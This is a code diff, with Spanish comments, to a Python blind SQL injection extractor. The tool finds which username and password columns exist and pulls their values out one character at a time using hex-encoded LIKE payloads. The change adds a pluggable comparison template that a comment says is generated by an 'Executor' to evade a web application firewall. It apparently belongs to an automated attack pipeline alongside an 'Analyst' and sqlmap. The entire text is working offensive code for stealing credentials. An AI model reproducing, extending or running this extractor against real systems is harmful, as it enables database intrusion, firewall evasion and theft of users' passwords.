@@ -23,7 +23,8 @@ Oracle = Callable[[str], bool]
 class BlindExtractor:
     def __init__(self, oracle: Oracle, quote: str = "", say: Optional[Callable[[str], None]] = None,
                  user_cols: Optional[Sequence[str]] = None,
-                 pass_cols: Optional[Sequence[str]] = None):
+                 pass_cols: Optional[Sequence[str]] = None,
+                 like: Optional[str] = None):
         self.oracle = oracle
         self.q = quote
         self.say = say or (lambda _m: None)
@@ -31,6 +32,8 @@ class BlindExtractor:
         # Candidatos de nombre de columna (del Analyst/sqlmap); respaldo mínimo si no llegan.
         self.user_cols = tuple(user_cols) if user_cols else _USER_COLS
         self.pass_cols = tuple(pass_cols) if pass_cols else _PASS_COLS
+        # Forma de comparación (la GENERA el Executor; evade el WAF con LIKE+hex). Respaldo: la básica.
+        self.like = like or "{col} LIKE {hex}"
 
     def _cond(self, condition: str) -> bool:
         """Envía `1{q} AND <condition>-- -` y devuelve si fue verdadera (hubo fila)."""
@@ -43,7 +46,7 @@ class BlindExtractor:
 
     def column_exists(self, col: str) -> bool:
         # `col LIKE 0x25` (0x25 = '%') devuelve fila si la columna existe; si no, error -> sin fila
-        return self._cond(f"{col} LIKE 0x25")
+        return self._cond(self.like.format(col=col, hex="0x25"))
 
     def find_column(self, candidates) -> str:
         for c in candidates:
@@ -58,7 +61,7 @@ class BlindExtractor:
             found = None
             for ch in charset:
                 like_hex = "0x" + (value + ch).encode("utf-8").hex() + "25"  # LIKE 'value+ch%'
-                if self._cond(f"{col} LIKE {like_hex}"):
+                if self._cond(self.like.format(col=col, hex=like_hex)):
                     found = ch
                     break
             if found is None:
